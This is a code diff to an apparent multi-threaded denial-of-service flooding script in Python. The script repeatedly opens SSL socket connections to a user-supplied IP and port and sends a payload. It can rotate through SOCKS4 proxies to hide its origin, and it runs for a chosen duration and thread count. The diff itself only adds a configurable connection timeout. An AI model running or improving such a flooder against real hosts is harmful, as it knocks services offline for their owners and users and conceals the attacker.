@@ -8,7 +8,7 @@ from urllib.parse import urlparse
 _proxies = []
 _abort = threading.Event()
 
-def _worker1(_ip, _prt, _ver): # not proxified
+def _worker1(_ip, _prt, _ver, _tout): # not proxified
     global _abort
     warnings.filterwarnings("ignore", category=DeprecationWarning)    
     
@@ -23,7 +23,9 @@ def _worker1(_ip, _prt, _ver): # not proxified
     while not _abort.is_set():
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(int(_tout))
             s.connect((_ip, int(_prt)))
+            
             ssl_sock = ssl.wrap_socket(s)
             ssl_sock.send(payload.format('\x4d\x6f\x92\xc9').encode())
             
@@ -38,7 +40,7 @@ def _worker1(_ip, _prt, _ver): # not proxified
         except:
             print('\033[1m\033[31mRejected by endpoint!')
 
-def _worker2(_ip, _prt, _ver, _reqs): # proxified
+def _worker2(_ip, _prt, _ver, _reqs, _tout): # proxified
     global _abort, _proxies
     warnings.filterwarnings("ignore", category=DeprecationWarning)    
     
@@ -58,7 +60,7 @@ def _worker2(_ip, _prt, _ver, _reqs): # proxified
             _count = 0
             
             s = socks.socksocket()
-            s.settimeout(2)
+            s.settimeout(int(_tout))
             s.set_proxy(socks.SOCKS4, _pip, int(_pprt))
             s.connect((_ip, int(_prt)))
             
@@ -134,6 +136,8 @@ dMP   dMMMMMP VMMMP" dMMMMMP dMP dMP dMP
             _reqs = int(input('\033[37m# of requests per proxy:\033[32m '))
             _loadprox()
         
+        _wait = int(input('\033[37mTimeout (sec):\033[32m '))
+        
         _time = int(input('\033[37mDuration (sec):\033[32m '))
         
         _thdz = int(input('\033[37mThreads (default 5):\033[32m '))
@@ -149,9 +153,9 @@ dMP   dMMMMMP VMMMP" dMMMMMP dMP dMP dMP
     
     for _ in range(_thdz):
         if _prox.lower() == 'n':
-            x = threading.Thread(target=_worker1, args=(_ip, _prt, _ver))
+            x = threading.Thread(target=_worker1, args=(_ip, _prt, _ver, _wait))
         else:
-            x = threading.Thread(target=_worker2, args=(_ip, _prt, _ver, _reqs))
+            x = threading.Thread(target=_worker2, args=(_ip, _prt, _ver, _reqs, _wait))
         
         x.daemon = True
         tasks.append(x)
